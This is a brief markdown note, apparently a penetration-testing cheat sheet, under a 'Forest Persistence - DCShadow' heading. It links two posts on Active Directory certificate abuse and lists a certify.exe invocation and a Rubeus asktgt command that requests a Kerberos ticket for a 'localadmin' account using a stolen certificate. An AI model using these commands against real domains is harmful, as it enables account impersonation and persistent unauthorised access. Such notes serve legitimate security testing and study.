# Forest Persistence - DCShadow

# Certificates
https://blog.harmj0y.net/activedirectory/certified-pre-owned/

https://posts.specterops.io/certificates-and-pwnage-and-patches-oh-my-8ae0f4304c1d

```./certify.exe```

```./Rubeus.exe asktgt /user:localadmin /certificate:C:\Temp\hi.pfx /password:Password01```
